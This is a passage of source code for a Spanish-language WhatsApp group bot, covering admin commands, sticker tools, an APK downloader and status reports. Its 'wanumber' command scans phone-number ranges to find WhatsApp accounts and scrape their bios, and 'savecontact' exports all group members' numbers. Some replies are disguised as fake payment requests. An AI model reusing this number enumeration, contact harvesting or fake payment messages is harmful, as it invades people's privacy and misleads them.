		if (!m.isGroup) return StickGroup()
		if (!isBotAdmins) return StickBotAdmin()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    await SenseiOfc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    replygc('Función ephemeral desactivada')
                    break
                case 'autoswview':
                case 'autostatusview':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    antiswview = false
                    replygc('Función autoswview/autostatusview desactivada')
                    break
                case 'unavailable':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].online = true
                    replygc('Función unavailable desactivada')
                    break
                case 'autorecordtype':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autorecordtype = false
                    replygc('Función autorecordtype desactivada')
                    break
                case 'autorecord':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autorecord = false
                    replygc('Función autorecord desactivada')
                    break
                case 'autotype':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autotype = false
                    replygc('Función autotype desactivada')
                    break
                case 'autobio':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autobio = false
                    replygc('Función autobio desactivada')
                    break
                case 'autosticker':
                case 'autostickergc':
		if (!m.isGroup) return StickGroup()
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autosticker = false
                    replygc('Función autosticker desactivada')
                    break
                case 'autoblock':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].autoblocknum = false
                    replygc('Función autoblock desactivada')
                    break
                case 'sologc':
                case 'onlygc':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlygrub = false
                    replygc('Función sologc/onlygc desactivada')
                    break
                case 'solopv':
                case 'onlypc':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlypc = false
                    replygc('Función solopv/onlypc desactivada')
                    break
                case 'onlyindia':
                case 'onlyindianumber':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlyindia = false
                    replygc('Función onlyindia desactivada')
                    break
                case 'onlyindo':
                case 'onlyindonumber':
		if (!isAdmins && !TheCreator) return StickAdmin()
                    db.data.settings[botNumber].onlyindo = false
                    replygc('Función onlyindo desactivada')
                    break
                    }
        default:
            replygc('Función no válida. Las funciones disponibles son:\n\n -welcome\n -antilink\n -antilinkgc\n -antilocation\n -anticontact\n -anticontact\n -anticontact\n -antidocument\n -antimedia\n -antiviewonce\n -antibot\n -antivirtex\n -antivirtex\n -antivideo\n -antiimage\n -antisticker\n -antipoll\n -antiforeign\n -antiaudio\n -adminevent\n -groupevent\n -ephemeral\n -autoswview\n -autostatusview\n -unavailable\n -autorecordtype\n -autorecord\n -autotype\n -autobio\n -autosticker\n -autoblock\n -sologc\n -solopv\n -onlyindia\n -onlyindonumber')
    }
}
break
case 'invite': case 'invitar': {
    if (!m.isGroup) return StickGroup()
    if (!isBotAdmins) return StickBotAdmin()
    if (!text) return replygc(`Ingresa el número que quieres invitar al grupo\n\nEjemplo:\n*${prefix + command}* 916909137213`)
    if (text.includes('+')) return replygc(`Ingresa el número sin *+*`)
    if (isNaN(text)) return replygc(`Ingresa solo los números con el código de país sin espacios`)
    let group = m.chat
    let link = 'https://chat.whatsapp.com/' + await SenseiOfc.groupInviteCode(group)
    await SenseiOfc.sendMessage(text + '@s.whatsapp.net', { text: `≡ *INVITACIÓN AL GRUPO*\n\nUn usuario te invita a unirte a este grupo\n\n${link}`, mentions: [m.sender] })
    replygc(`Se ha enviado un enlace de invitación al usuario`)
}
break
            case 'closetime': case 'horacierre':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygc('*selecciona:*\nsegundo\nminuto\nhora\n\n*Ejemplo*\n10 segundo')
                }
                replygc(`Tiempo de cierre ${q} a partir de ahora`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Tiempo de cierre* grupo cerrado por el administrador\nahora solo el administrador puede enviar mensajes`
                    SenseiOfc.groupSettingUpdate(m.chat, 'announcement')
                    replygc(close)
                }, timer)
                break
            case 'opentime': case 'horaapertura':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !TheCreator) return replygc(mess.admin)
                if (!isBotAdmins) return StickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygc('*selecciona:*\nsegundo\nminuto\nhora\n\n*Ejemplo*\n10 segundo')
                }
                replygc(`Tiempo de apertura ${q} a partir de ahora`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Tiempo de apertura* el grupo fue abierto por el administrador\n ahora los miembros pueden enviar mensajes`
                    SenseiOfc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygc(open)
                }, timer)
                break
            case 'kick': case 'eliminar':
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await SenseiOfc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygc(mess.done)
                break
                case "idgroup": case "groupid": {
		if (!TheCreator) return StickOwner()
		let getGroups = await SenseiOfc.groupFetchAllParticipating()
		let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
		let anu = groups.map((v) => v.id)
		let teks = `⬣ *LISTA DE GRUPOS A CONTINUACIÓN*\n\nTotal de grupos : ${anu.length} Grupos\n\n`
		for (let x of anu) {
		let metadata2 = await SenseiOfc.groupMetadata(x)
		teks += `◉ Nombre : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Miembros : ${metadata2.participants.length}\n\n────────────────────────\n\n`
		}
		replygc(teks + `Para usar, por favor escribe el comando ${prefix}pushcontact idgroup|teks\n\nAntes de usar, por favor primero copia el id del grupo de arriba`)
		}
		break
		case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
		           	if (!text) return replygc(`Proporciona el número con la última cifra x\n\nEjemplo: ${prefix + command} 91690913721x`)
		var inputnumber = text.split(" ")[0]
        
        	replygc(`Buscando cuenta de WhatsApp en el rango proporcionado...`)
	        function countInstances(string, word) {
	            return string.split(word).length - 1
	        }
	        var number0 = inputnumber.split('x')[0]
	        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
	        var random_length = countInstances(inputnumber, 'x')
	        var randomxx
	        if (random_length == 1) {
	            randomxx = 10
	        } else if (random_length == 2) {
	            randomxx = 100
	        } else if (random_length == 3) {
	            randomxx = 1000
	        }
	        var text66 = `*==[ Lista de Números de Whatsapp ]==*\n\n`
	        var nobio = `\n*Bio:* || \n¡Hola! Estoy usando WhatsApp.\n`
	        var nowhatsapp = `\n*Números sin cuenta de WhatsApp dentro del rango proporcionado.*\n`
	        for (let i = 0; i < randomxx; i++) {
            	var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            	var status1 = nu[Math.floor(Math.random() * nu.length)]
            	var status2 = nu[Math.floor(Math.random() * nu.length)]
            	var status3 = nu[Math.floor(Math.random() * nu.length)]
            	var dom4 = nu[Math.floor(Math.random() * nu.length)]
            	var random21
            	if (random_length == 1) {
                random21 = `${status1}`
            	} else if (random_length == 2) {
                random21 = `${status1}${status2}`
            	} else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            	} else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            	}
            	var anu = await SenseiOfc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            	var anuu = anu.length !== 0 ? anu : false
            	try {
                try {
                    var anu1 = await SenseiOfc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Número:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Última actualización :* ${moment(anu1.setAt).tz('America/Lima').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            	} catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            	}
        	}
        	replygc(`${text66}${nobio}${nowhatsapp}`)
        	}
break
case 'savecontact': case 'guardarcontacto': case 'svcontact': {
    if (!m.isGroup) return StickGroup()
    if (!(isGroupAdmins || TheCreator)) return StickAdmin()
    let cmiggc = await SenseiOfc.groupMetadata(m.chat)
    let orgiggc = participants.map(a => a.id)
    vcard = ''
    noPort = 0
    for (let a of cmiggc.participants) {
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
    }
    let nmfilect = './contacts.vcf'
    replygc('\nTen paciencia, amigo, guardando... ' + cmiggc.participants.length + ' contactos')
    require('fs').writeFileSync(nmfilect, vcard.trim())
    await sleep(2000)
    SenseiOfc.sendMessage(m.chat, {
        document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contacto.vcf', caption: '\nÉxito\nGrupo: *' + cmiggc.subject + '*\nContactos: *' + cmiggc.participants.length + '*'
    }, { ephemeralExpiration: 86400, quoted: m })
    require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
    if (!m.isGroup) return StickGroup()
    if (!m.mentionedJid[0]) return replygc('\nUsa así\n Ejemplo: .sendcontact @mención|nombre')
    let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contacto'
    let snContact = {
        displayName: "Contacto", contacts: [{ displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + snTak + ";;;\nFN:" + snTak + "\nitem1.TEL;waid=" + m.mentionedJid[0].split('@')[0] + ":" + m.mentionedJid[0].split('@')[0] + "\nitem1.X-ABLabel:Mobile\nEND:VCARD" }]
    }
    SenseiOfc.sendMessage(m.chat, { contacts: snContact }, { ephemeralExpiration: 86400 })
}
break
case 'contacttag': case 'contag': {
    if (!m.isGroup) return StickGroup()
    if (!(isGroupAdmins || TheCreator)) return StickAdmin()
    if (!m.mentionedJid[0]) return replygc('\nUsa así\n Ejemplo: .contacttag @mención|nombre')
    let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contacto'
    let sngContact = {
        displayName: "Contacto", contacts: [{ displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + sngTak + ";;;\nFN:" + sngTak + "\nitem1.TEL;waid=" + m.mentionedJid[0].split('@')[0] + ":" + m.mentionedJid[0].split('@')[0] + "\nitem1.X-ABLabel:Mobile\nEND:VCARD" }]
    }
    SenseiOfc.sendMessage(m.chat, { contacts: sngContact, mentions: participants.map(a => a.id) }, { ephemeralExpiration: 86400 })
}
break
            case 'add': case 'añadir':
                if (!m.isGroup) return StickGroup()
                if(!TheCreator) return StickOwner()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await SenseiOfc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygc(mess.done)
                break
            case 'promover':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await SenseiOfc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygc(mess.done)
                break
            case 'degradar':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await SenseiOfc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygc(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                if (!text) return replygc('Text ?')
                await SenseiOfc.groupUpdateSubject(m.chat, text)
                replygc(mess.done)
                break
                case 'userjid':{
          	if(!TheCreator) return StickOwner()
        const groupMetadata = m.isGroup ? await SenseiOfc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygc(textt)
    }
    break
case 'creategc': case 'creargrupo': {
    if (!TheCreator) return StickOwner()
    if (!args.join(" ")) return replygc(`Usa ${prefix+command} nombregrupo`)
    try {
        let cret = await SenseiOfc.groupCreate(args.join(" "), [])
        let response = await SenseiOfc.groupInviteCode(cret.id)
        const teksop = `     「 Crear Grupo 」

▸ Nombre : ${cret.subject}
▸ Propietario : @${cret.owner.split("@")[0]}
▸ Creación : ${moment(cret.creation * 1000).tz("America/Lima").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
        SenseiOfc.sendMessage(m.chat, { text: teksop, mentions: await SenseiOfc.parseMention(teksop) }, { quoted: m })
    } catch {
        replygc(`Error`)
    }
}
break
case 'setbotbio': {
    if (!TheCreator) return StickOwner()
    if (!text) return replygc(`¿Dónde está el texto?\nEjemplo: ${prefix + command} Cheems Bot`)
    await SenseiOfc.updateProfileStatus(text)
    replygc(`Éxito al cambiar la biografía del número del bot`)
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    await SenseiOfc.removeProfilePicture(from)
}
break
case 'deleteppbot': case 'delppbot': {
    if (!TheCreator) return StickOwner()
    await SenseiOfc.removeProfilePicture(SenseiOfc.user.id)
    replygc(`Éxito al eliminar la foto de perfil del bot`)
}
break
case 'setdesc':
case 'setdesk':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    if (!text) return replygc('¿Texto?')
    await SenseiOfc.groupUpdateDescription(m.chat, text)
    replygc(mess.done)
    break
case 'setppgroup':
case 'setppgrup':
case 'setppgc':
case 'setgrouppp':
case 'setgruppp':
case 'setgcpp':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins) return replygc(mess.admin)
    if (!isBotAdmins) return StickBotAdmin()
    if (!quoted) return replygc(`Envía/Responde con una imagen con subtítulo ${prefix + command}`)
    if (!/image/.test(mime)) return replygc(`Envía/Responde con una imagen con subtítulo ${prefix + command}`)
    if (/webp/.test(mime)) return replygc(`Envía/Responde con una imagen con subtítulo ${prefix + command}`)
    var medis = await SenseiOfc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await SenseiOfc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygc(mess.done)
                } else {
                    var memeg = await SenseiOfc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygc(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return StickGroup()
                if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
                if (!isBotAdmins) return StickBotAdmin()
                let me = m.sender
                let teks = `╭─═⊣🚀 *_𝐈𝐍𝐕𝐎𝐂𝐀𝐑_* 🚀⊢═─╮
│ 
│ ➥ *Tagger:*  @${me.split('@')[0]}
│ ➥ *Message:* ${q ? q : ''}
├─⊣╲╱╲╱╲╱╲╱╲╱╲╱╲╱╲╱⊢─┤
│\n`
                for (let mem of participants) {
                teks += `│ 🪀 @${mem.id.split('@')[0]}\n`
                }
 	teks += `╰─⊣🌌───────🌌⊢─╯`
                SenseiOfc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'hidetag':
    if (!m.isGroup) return StickGroup();
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin();
    if (!isBotAdmins) return StickBotAdmin();
    if (m.quoted) {
        SenseiOfc.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map(a => a.id)
        });
    } else if (m.text) {
        SenseiOfc.sendMessage(m.chat, {
            text: m.text,
            mentions: participants.map(a => a.id)
        }, {
            quoted: m
        });
    } else {
        return StickGroup();
    }
    break
case 'group':
case 'grup':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    if (args[0] === 'close') {
        await SenseiOfc.groupSettingUpdate(m.chat, 'announcement').then((res) => replygc(`Grupo cerrado exitosamente`))
    } else if (args[0] === 'open') {
        await SenseiOfc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygc(`Grupo abierto exitosamente`))
    } else {
        replygc(`Modo ${command}\n\n\nEscribe ${prefix + command}open/close`)
    }
break
case 'editinfo':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    if (args[0] === 'open') {
        await SenseiOfc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygc(`Edición de información de grupo abierta exitosamente`))
    } else if (args[0] === 'close') {
        await SenseiOfc.groupSettingUpdate(m.chat, 'locked').then((res) => replygc(`Edición de información de grupo cerrada exitosamente`))
    } else {
        replygc(`Modo ${command}\n\n\nEscribe ${prefix + command}on/off`)
    }
break
case 'linkgroup':
case 'linkgrup':
case 'linkgc':
case 'gclink':
case 'grouplink':
case 'gruplink':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    let response = await SenseiOfc.groupInviteCode(m.chat)
    SenseiOfc.sendText(m.chat, `👥 *ENLACE DEL GRUPO*\n📛 *Nombre :* ${groupMetadata.subject}\n👤 *Dueño del Grupo :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'No conocido'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Enlace del Chat :* https://chat.whatsapp.com/${response}\n👥 *Miembros :* ${groupMetadata.participants.length}\n`, m, {
        detectLink: true
    })
break
           case 'getbio':
    try {
        let who;
        if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
        else who = m.quoted.sender ? m.quoted.sender : m.sender;
        let bio = await SenseiOfc.fetchStatus(who);
        replygc(bio.status);
    } catch {
        if (text) return replygc(`La biografía está privada o no has respondido al mensaje de la persona.`);
        else try {
            let who = m.quoted ? m.quoted.sender : m.sender;
            let bio = await SenseiOfc.fetchStatus(who);
            replygc(bio.status);
        } catch {
            return replygc(`La biografía está privada o no has respondido al mensaje de la persona.`);
        }
    }
break
case 'revoke':
case 'resetlink':
    if (!m.isGroup) return StickGroup()
    if (!isAdmins && !isGroupOwner && !TheCreator) return StickAdmin()
    if (!isBotAdmins) return StickBotAdmin()
    await SenseiOfc.groupRevokeInvite(m.chat)
        .then(res => {
            replygc(`Enlace restablecido con éxito`)
        })
break
// Estado del bot
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `*╔═════════════════╗*
*║      Informe del Servidor     ║*
*╚═════════════════╝*
*🚄Velocidad de respuesta⚡*\n•Total: ${latensi.toFixed(4)} _Segundo_ \n•Detalles: ${oldd - neww} _milisegundos_\n\n*⏱️Tiempo de ejecución* :\n•Duración total: ${runtime(process.uptime()).replace("days", "días").replace("hours", "horas").replace("minutes", "minutos").replace("seconds", "segundos")}

*💻 Info del servidor 📊*
•RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

*_🤖 Uso de memoria de NodeJS 🤖_*
    ${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `*_💻 Uso total de CPU 💻_*
    ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `• *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

*_🔄 Uso de núcleos de CPU (${cpus.length} núcleos de CPU) 🔄_*
    ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `• *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
*╔══════════════╗*
*║       fin del Informe      ║*
*╚══════════════╝*`.trim()
	SenseiOfc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    }
	
	break
case 'repo':
case 'repository':
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Nombre del Repositorio: ${repoData.name}
${themeemoji} Descripción: ${repoData.description}
${themeemoji} Propietario: ${repoData.owner.login}
${themeemoji} Estrellas: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await SenseiOfc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, {})
    } else {
      await replygc(`No se puede obtener la información del repositorio`)
    }
  } catch (error) {
    console.error(error)
    await replygc(`El repositorio no está disponible actualmente`)
  }
break
case 'buypremium':
case 'premiumuser':
    let teksBuyPremium = `Hola ${pushname}👋\n¿Quieres comprar Premium? Simplemente chatea con el propietario😉`;
    await SenseiOfc.sendMessage(m.chat, {
        text: teksBuyPremium,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });
    break
case 'rentbot':
    replygc(`Escribe ${prefix}owner y chatea con él`);
    break
case 'speedtest': {
                replygc('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) SenseiOfc.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) SenseiOfc.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
    let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHola @${me.split('@')[0]} 👋\nNo olvides donar sí 🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
    sendSenseiOfcMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: false, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./Media/theme/menu.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'owner': {
    let list = []
    for (let i of owner) {
        list.push({
            displayName: await SenseiOfc.getName(i),
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await SenseiOfc.getName(i)}\nFN:${await SenseiOfc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
        })
    }
    
    SenseiOfc.sendMessage(from, {
        contacts: list
    }, {
        quoted: m
    })}
    break
case 'apk':
case 'apkdl':{
    if (!text) return replygc("¿Qué APK quieres descargar?");
    let reserik = await fetch(`https://vihangayt.me/download/apk?id=${text}`);
    let jsonerik = await reserik.json();
    await SenseiOfc.sendMessage(m.chat, { document: { url: jsonerik.data.dllink }, fileName: jsonerik.data.name, mimetype: 'application/vnd.android.package-archive' }, { quoted: m })
        .catch(console.error);
}
break
case 'buscarstickers':
case 'buscartsicker': {
    if (!isPremium) return replyprem(mess.premium)
    if (!args[0]) return replygc(`Ingresa lo que deseas buscar \n\n📌*Ejemplo:*\n${prefix + command} mono`);
    const fg = require('api-dylux');
    try {
        let json = await fg.StickerSearch(text);
        replygc(`
▢ *Título:* ${json.title}
▢ *Total de stickers:* ${json.sticker_url.length}
▢ *Tiempo estimado de entrega:* _*${json.sticker_url.length * 2} s*_

*Nota:* WhatsApp puede encontrar este comando como spam, ten cuidado`);

        for (let url of json.sticker_url) {
            await SenseiOfc.sendMessage(m.chat, { sticker: { url } });
        }
    } catch (e) {
        replygc(`¡Error!`);
    }
}
break
case 's': case 'sticker': case 'stiker': {
    if (!quoted) return replygc(`Envía/Responde a imágenes/videos/GIFs con subtítulos ${prefix + command}\nDuración del video de 1 a 9 segundos`)
    if (/image/.test(mime)) {
        let media = await quoted.download()
        let encmedia = await SenseiOfc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
    } else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 9) return replygc('Envía/Responde a imágenes/videos/GIFs con subtítulos ${prefix + command}\nDuración del video de 1 a 9 segundos')
        let media = await quoted.download()
        let encmedia = await SenseiOfc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
    } else {
        replygc(`Envía/Responde a imágenes/videos/GIFs con subtítulos ${prefix + command}\nDuración del video de 1 a 9 segundos`)
    }
}
break
case 'wm': case 'steal': case 'stickerwm': case 'take': {
    if (!isPremium) return replyprem(mess.premium)
    if (!args.join(" ")) return replygc(`¿Dónde está el texto?`)
    const swn = args.join(" ")
    const pcknm = swn.split("|")[0]
    const atnm = swn.split("|")[1]
    if (m.quoted.isAnimated === true) {
        SenseiOfc.downloadAndSaveMediaMessage(quoted, "gifee")
        SenseiOfc.sendMessage(from, { sticker: fs.readFileSync("gifee.webp") }, { quoted: m })
    } else if (/image/.test(mime)) {
        let media = await quoted.download()
        let encmedia = await SenseiOfc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
    } else if (/video/.test(mime)) {
